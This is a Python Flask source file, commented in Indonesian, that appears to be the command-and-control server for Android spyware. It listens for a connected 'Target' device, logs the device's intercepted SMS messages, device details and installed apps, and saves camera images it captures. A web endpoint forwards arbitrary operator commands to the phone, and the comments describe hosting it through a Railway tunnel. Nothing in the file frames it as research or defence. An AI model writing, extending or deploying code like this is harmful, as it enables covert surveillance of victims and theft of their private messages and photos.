import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template

# --- Globals & Setup ---
app = Flask(__name__)
client_socket = None
client_address = None
running = True

# List untuk nyimpen log yang bakal ditampilin di Web UI
server_logs = []

# Bikin folder kalau belum ada
for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(folder): os.makedirs(folder)

def add_log(message):
    """Fungsi pembantu buat nambahin log ke memori dan print ke console backend"""
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    server_logs.append(formatted_msg)
    # Simpan 100 log terakhir aja biar memori gak jebol
    if len(server_logs) > 100:
        server_logs.pop(0)

# --- Data Handlers (Versi Web) ---
def handle_incoming_data(data):
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')

        if log_type == 'SMS_LOG':
            log = payload.get('log', {})
            add_log(f"[SMS - {log.get('userSender')}] {log.get('content')}")
        elif log_type == 'DEVICE_INFO':
            info = payload.get('info', {})
            add_log(f"[INFO] Model: {info.get('Model')} | Battery: {info.get('Battery')} | Android: {info.get('AndroidVersion')}")
        elif log_type == 'IMAGE_DATA':
            filename = payload.get('image', {}).get('filename', f"img_{int(time.time())}.jpg")
            filepath = os.path.join('captured_images', filename)
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(payload.get('image', {}).get('image_base64', '')))
            add_log(f"[IMAGE] Saved to {filepath}")
        elif log_type == 'APP_LIST':
            apps = payload.get('apps', [])
            add_log(f"[APPS] Found {len(apps)} installed applications.")
        else:
            add_log(f"[RECV] {log_type} received.")

    except json.JSONDecodeError:
        add_log("[ERROR] Received non-JSON data")
    except Exception as e:
        add_log(f"[ERROR] Processing data: {e}")

# --- TCP Server Logic (Background Thread) ---
def tcp_listener():
    global client_socket, client_address, running
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # TCP Tunnel Railway di port 9090
    server.bind(('0.0.0.0', 9090))
    server.listen(1)
    add_log("[*] TCP Server listening on port 9090")

    while running:
        try:
            server.settimeout(2.0) # Biar bisa ngecek status 'running' buat shutdown
            conn, addr = server.accept()
            client_socket, client_address = conn, addr
            add_log(f"[+] Target Connected: {addr[0]}:{addr[1]}")
            
            buffer = ""
            while client_socket:
                try:
                    data = client_socket.recv(16384).decode('utf-8', errors='ignore')
                    if not data: break
                    buffer += data
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        if line.strip(): handle_incoming_data(line.strip())
                except Exception as e:
                    break
            
            add_log("[-] Target Disconnected")
            client_socket = None
            client_address = None
        except socket.timeout:
            continue
        except Exception as e:
            if running: add_log(f"[!] TCP Server Error: {e}")

# --- Web Framework Routes (HTTP) ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify({
        "connected": client_socket is not None,
        "address": client_address,
        "logs": server_logs
    })

@app.route('/api/command', methods=['POST'])
def send_command():
    global client_socket
    if not client_socket:
        return jsonify({"status": "error", "message": "No target connected"}), 400
    
    data = request.json
    cmd = data.get('cmd')
    
    if not cmd:
         return jsonify({"status": "error", "message": "Empty command"}), 400
         
    try:
        add_log(f"[SEND] Command: {cmd}")
        client_socket.sendall(f"{cmd}\n".encode())
        return jsonify({"status": "success"})
    except Exception as e:
        client_socket = None
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # 1. Jalankan TCP listener di thread terpisah
    threading.Thread(target=tcp_listener, daemon=True).start()
    
    # 2. Jalankan Flask Server. 
    # Railway ngebaca variabel environment PORT buat web HTTP-nya (default lu bilang 9191)
    web_port = int(os.environ.get("PORT", 9191))
    app.run(host='0.0.0.0', port=web_port)
